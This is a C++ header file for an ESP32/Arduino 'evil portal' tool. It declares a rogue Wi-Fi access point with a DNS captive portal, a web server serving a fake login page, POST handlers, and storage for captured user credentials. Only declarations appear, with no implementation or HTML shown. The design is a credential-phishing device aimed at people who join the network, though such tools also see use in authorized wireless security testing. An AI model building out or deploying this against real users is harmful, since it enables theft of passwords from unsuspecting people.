#ifndef EVIL_PORTAL_H
#define EVIL_PORTAL_H

#include <Arduino.h>
#include <WiFi.h>
#include <ESPAsyncWebServer.h>
#include <DNSServer.h>
#include "config.h"

// Evil Portal Manager class
class EvilPortalManager {
public:
    EvilPortalManager();
    ~EvilPortalManager();
    
    // Initialization
    bool begin(const char* ssid = PORTAL_AP_NAME, uint8_t channel = PORTAL_CHANNEL);
    void end();
    
    // Server management
    void startAP();
    void stopAP();
    void setupRoutes();
    void loop();
    
    // Credential management
    int getCapturedCredsCount();
    String getLastCredential();
    void clearCredentials();
    
    // Status
    bool isActive();
    int getClientCount();
    
private:
    AsyncWebServer* webServer;
    DNSServer* dnsServer;
    
    String apName;
    uint8_t apChannel;
    bool active;
    
    // Captured credentials
    std::vector<String> capturedCreds;
    String lastCred;
    int totalCaptured;
    
    // HTML pages
    String htmlPage;
    
    // Request handlers
    void handleRoot(AsyncWebServerRequest* request);
    void handlePost(AsyncWebServerRequest* request);
    void handleNotFound(AsyncWebServerRequest* request);
    
    // HTML generators
    String getDefaultHTML();
    String getSuccessHTML();
    
    // DNS captive portal
    void setupDNS();
};

// Global instance
extern EvilPortalManager evilPortal;

// Default HTML template
extern const char PORTAL_HTML[] PROGMEM;

#endif // EVIL_PORTAL_H
